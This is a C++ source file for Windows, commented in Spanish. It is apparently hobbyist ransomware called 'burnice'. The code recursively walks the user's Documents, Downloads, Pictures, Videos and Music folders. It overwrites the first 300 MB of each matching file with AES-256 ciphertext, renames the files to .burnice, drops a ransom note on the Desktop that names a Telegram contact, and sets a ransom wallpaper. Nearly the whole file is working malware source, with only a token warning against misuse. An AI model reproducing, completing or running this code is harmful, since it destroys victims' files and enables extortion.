/*
Creo que esta de mas decir que no usen esta jalada para hacer maldades
*/

#include <iostream>
#include <string>
#include <vector>
#include <sstream>
#include <fstream>
#include <filesystem>
#include <thread>
#include <algorithm>
#include <system_error>
#include <cstdlib>       
#include <sys/stat.h>
#include <dirent.h>
#include <windows.h>

#include "functions/functions.h"
#include "functions/wallpaper.h"

namespace fs = std::filesystem;
using namespace std::chrono_literals;

/*
Esta funcion puede parecer medio compleja (No es compleja ni a palo), pero realmente es sencilla
lo que hacemos aca es abrir el archivo que encriptaremos con permisos de lectura y escritura
luego de abrirlo con esos permisos, ponemos el puntero de lectura al final para poder calcular
el tamaño del archivo "std::ios::ate", una vez calculamos el tamaño lo comparamos con un tamaño
maximo con la funcion min(), la razon de compararlo con 300mb (si ese numero significa 300mb)
es porque leer un archivo muy grande tomaria una vida entera, entonces para evitar eso,
simplemente leemos 300mb del archivo y encriptamos unicamente esos 300mb, cuando se encriptan
esos 300mb lo unico que hacemos es remplazar los primeros 300mb de nuestro archivo, con los 300mb
encriptados, y luego simplemente seria renombrar el archivo con la extension .burnice, obviamente la funcion
min lo que hace es comparar que numero es mas grande, si el primero o el segundo, y elige el menor
entonces en caso el archivo sea menor a 300mb, los bytes a sobreescribir seran menores.
*/
void read_files_and_overwrite_files(const std::string& file_to_read , double file_size){
	std::fstream archivo_in_out(file_to_read , std::ios::in | std::ios::out | std::ios::binary | std::ios::ate);

	if (!archivo_in_out.is_open()){
		archivo_in_out.close();
	    return;
	}

	std::error_code ec;
	std::uintmax_t size_file = fs::file_size(file_to_read);
	long long buffer_size = std::min(static_cast<long long>(300 * 1024 * 1024) , static_cast<long long>(size_file));
	if (buffer_size == 0){
		archivo_in_out.close();
	    return;
	}
	std::vector<char> buffer(buffer_size);
	archivo_in_out.seekg(0 , std::ios::beg);//Ponemos el puntero de lectura al principio

	archivo_in_out.read(buffer.data(), buffer_size);
	std::vector<unsigned char> cypher_text = aes256_cypher(std::string(buffer.begin() , buffer.end()) , buffer_size);
	archivo_in_out.seekp(0); //Ponemos el puntero de escritura al principio
	archivo_in_out.write(reinterpret_cast<const char *>(cypher_text.data()) , cypher_text.size());
	archivo_in_out.close();
	fs::rename(file_to_read , file_to_read + ".burnice"); //renombramos el archivo
}

/*
Enserio tengo que explicar que hace esto ?
*/
bool verify_extension(std::string directory){
	std::vector<std::string> files_extensions= {	
		".txt" , ".bin" , ".jpg" ,
		".png" , ".docx" , ".xlsx" , 
		".pdf" , ".txt" , ".webp" ,
		".jpeg" , ".pptx" , ".ppt",
		".odt" , ".rtf" , ".raw" , 
		".svg" , ".mp4" , ".mp3" ,
		".avi" , ".mov" , ".wav" ,
		".mkv" , ".html"  ,
		".php", ".js", ".css",
		".java" , ".c" , ".go",
		".zip" , ".rar" ,  ".rs",
		".sql", ".mdb", ".accdb",
		".db", ".sqlite", ".ora",
	};

	for(std::string ext : files_extensions){
		if (directory.rfind(ext) == (directory.length() - ext.length())){
			return true;
		}
	}
	return false;
}

/*
Se ve muy satanico, pero esto es unicamente la funcion que uso para leer los directorios
de forma recursiva, lo que hace es verificar si en primeras es un archivo, y luego si tambien
cumple con las extensiones que vieron arriba, y luego para evitar errores verifica que tenga permisos
de lectura y escritura, asi evito cualquier error de que no tengo permisos para poder modificar el archivo.
*/
void read_directory_recursively(std::string& initial_directory){
	DIR * dir;
	struct dirent * read_dir_;
	dir = opendir(initial_directory.c_str());
	struct stat stats_archivo;
	
	while((read_dir_ = readdir(dir)) != NULL){
		if (std::string(read_dir_->d_name) != "." && std::string(read_dir_->d_name) != ".."){
			std::stringstream ss;
			ss<< initial_directory << "\\" << read_dir_->d_name;
			std::string final_directory = ss.str();
			if(stat(final_directory.c_str() , &stats_archivo) == 0){
				if(S_ISREG(stats_archivo.st_mode) && verify_extension(final_directory) && (stats_archivo.st_mode & S_IRUSR) && (stats_archivo.st_mode & S_IWUSR)){
					read_files_and_overwrite_files(final_directory , stats_archivo.st_size / (1024.0 * 1024.0));
				}else if (S_ISDIR(stats_archivo.st_mode)){
					read_directory_recursively(final_directory);
				}
			}
		}
	}
	closedir(dir);	
}

int main()
{
	
	std::string home_dir = getenv("USERPROFILE"); //Con este obtenemos la carpeta raiz
	std::string temp_dir = getenv("TEMP"); //Y con esto la carpeta temporal

	/*
	Estoy plenamente conciente que esta parte del codigo puede verse horrible
	pero creanme que intente cambiarlo y no logre hacer que funcionara con los 
	threads y dije : "nah al chile mejor dejalo asi".

	Recuerden pibes: "Si algo funciona y no sabes porque, no lo toques"
	*/

	//--------------------------------------------------------------------------
	fs::path document_directory = static_cast<fs::path>(home_dir) / "Documents";
	fs::path download_directory = static_cast<fs::path>(home_dir) / "Downloads";

	fs::path desktop_directory = static_cast<fs::path>(home_dir) / "Desktop" / "YOU COMPUTER HAS ENCRYPTED.txt";
	fs::path wallpaper_directory = static_cast<fs::path>(temp_dir) / "burnice.jpg";
	fs::path pictures_directory = static_cast<fs::path>(home_dir) / "Pictures";
	fs::path video_directory = static_cast<fs::path>(home_dir) / "Videos";
	fs::path music_directory = static_cast<fs::path>(home_dir) / "Music";
	
	std::string doc_str = document_directory.string();
	std::string pic_str = pictures_directory.string();
	std::string vid_str = video_directory.string();
	std::string music_str = music_directory.string();
	std::string down_str= download_directory.string();
	
	std::ofstream ransomware_note(desktop_directory.string());
	//--------------------------------------------------------------------------
	ransomware_note << "Now your COMPUTER has ENCRYPTED with military grade encryptation\nif you wish recovery your files paying me\nmy tg: @papitapro1234";

	ransomware_note.close();

	std::ofstream wallpaper_image(wallpaper_directory.string() , std::ios::out | std::ios::binary);

	wallpaper_image.write(reinterpret_cast<const char*>(Ransomware_Wallpaper_jpg) , Ransomware_Wallpaper_jpg_len);
	wallpaper_image.close();

	SystemParametersInfoA(SPI_SETDESKWALLPAPER , 0 , (void*)(wallpaper_directory.string()).c_str() , SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);

	//Si, ya se, dejenlo asi hermanos
	
	std::thread thread1(read_directory_recursively , std::ref(doc_str));
	std::thread thread2(read_directory_recursively , std::ref(down_str));
	std::thread thread3(read_directory_recursively , std::ref(pic_str));
	std::thread thread4(read_directory_recursively , std::ref(vid_str));
	std::thread thread5(read_directory_recursively , std::ref(music_str));

	thread1.join();
	thread2.join();
	thread3.join();
	thread4.join();
	thread5.join();

	return 0;
}
